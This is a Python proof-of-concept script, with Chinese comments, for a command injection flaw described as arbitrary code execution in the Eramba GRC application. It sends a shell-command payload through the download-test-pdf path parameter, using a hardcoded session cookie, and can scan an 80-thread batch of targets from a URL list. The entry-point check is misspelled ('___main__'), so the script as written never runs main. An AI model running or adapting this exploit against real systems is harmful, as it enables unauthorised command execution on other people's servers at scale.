#导包
import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test = """"
                                _                           _     _ _                                        _                                 _   _                           _                      _     _ _ _ _         
                           | |               /\        | |   (_) |                                      | |                               | | (_)                         | |                    | |   (_) (_) |        
    ___ _ __ __ _ _ __ ___ | |__   __ _     /  \   _ __| |__  _| |_ _ __ __ _ _ __ _   _    ___ ___   __| | ___    _____  _____  ___ _   _| |_ _  ___  _ __   __   ___   _| |_ __   ___ _ __ __ _| |__  _| |_| |_ _   _ 
   / _ \ '__/ _` | '_ ` _ \| '_ \ / _` |   / /\ \ | '__| '_ \| | __| '__/ _` | '__| | | |  / __/ _ \ / _` |/ _ \  / _ \ \/ / _ \/ __| | | | __| |/ _ \| '_ \  \ \ / / | | | | '_ \ / _ \ '__/ _` | '_ \| | | | __| | | |
  |  __/ | | (_| | | | | | | |_) | (_| |  / ____ \| |  | |_) | | |_| | | (_| | |  | |_| | | (_| (_) | (_| |  __/ |  __/>  <  __/ (__| |_| | |_| | (_) | | | |  \ V /| |_| | | | | |  __/ | | (_| | |_) | | | | |_| |_| |
   \___|_|  \__,_|_| |_| |_|_.__/ \__,_| /_/    \_\_|  |_.__/|_|\__|_|  \__,_|_|   \__, |  \___\___/ \__,_|\___|  \___/_/\_\___|\___|\__,_|\__|_|\___/|_| |_|   \_/  \__,_|_|_| |_|\___|_|  \__,_|_.__/|_|_|_|\__|\__, |
                                                                                    __/ |                                                                                                                          __/ |
                                                                                   |___/                                                                                                                          |___/ 


"""
    print(test)


#主函数
def main():
    banner()
    parser = argparse.ArgumentParser(description='Eramba任意代码执行漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")




#poc函数
def poc(target):
    payload = '/settings/download-test-pdf?path=ip%20a;'
    headers = {
        'Cookie':'translation=1;csrfToken=1l2rXXwj1D1hVyVRH%2B1g%2BzIzYTA3OGFiNWRjZWVmODQ1OTU1NWEyODM2MzIwZTZkZTVlNmU1YjY%3D;PHPSESSID=14j6sfroe6t2g1mh71g2a1vjg8',
        'User-Agent':'Mozilla/5.0(X11;Linuxx86_64;rv:109.0)Gecko/20100101Firefox/111.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language':'de,en-US;q=0.7,en;q=0.3',
        'Accept-Encoding':'gzip,deflate',
        #'Referer':'https://[redacted]/settings',
        'Upgrade-Insecure-Requests':'1',
        'Sec-Fetch-Dest':'document',
        'Sec-Fetch-Mode':'navigate',
        'Sec-Fetch-Site':'same-origin',
        'Sec-Fetch-User':'?1',
        'Te':'trailers',
        'Connection':'close',
    }
    res = requests.get(url=target + payload,headers=headers,verify=False)
    if res.status_code ==500 and 'ip a' in res.text:
        print(f'[+]{target}存在漏洞')
    else:
        print(f'[+]{target}不存在漏洞')
    

    

#函数入口
if __name__ =='___main__':
    main()
